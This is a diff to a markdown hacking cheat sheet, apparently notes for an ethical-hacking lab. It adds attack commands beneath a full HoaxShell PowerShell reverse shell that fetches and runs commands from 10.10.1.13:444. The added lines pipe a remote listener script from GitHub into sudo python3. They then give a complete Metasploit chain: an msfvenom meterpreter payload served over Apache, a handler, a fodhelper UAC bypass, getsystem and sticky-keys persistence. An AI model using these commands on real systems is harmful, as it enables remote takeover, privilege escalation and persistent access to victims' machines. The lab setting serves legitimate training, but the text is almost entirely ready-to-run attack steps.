@@ -204,6 +204,8 @@ HoaxShell
 Powershell IEX 
 $s='10.10.1.13:444';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
 
+oaxshell
+sudo python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t ps-iex -p 444
 
 
 **Reverse shell / netcat**
@@ -252,6 +254,43 @@ history -c
 ```
 nmap 10.10.1.0/24
 nmap -A -sC -sV [IP]
+```
+```
+Task : Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
+Run mkdir /var/www/html/share command to create a shared folder
+Run chmod -R 755 /var/www/html/share command
+Run chown -R www-data:www-data /var/www/html/share command
+
+
+ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
+ cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+service apache2 start
+msfconsole
+use exploit/multi/handle
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+
+sysinfo
+getuid
+background
+search bypassuac
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+show options
+set LHOST 10.10.1.13
+ set TARGET 0
+exploit
+getsystem -t 1 
+getuid
+background
+post/windows/manage/sticky_keys
+sessions -i*
+set session 2
+exploit  
+
+
 ```
 
 ---
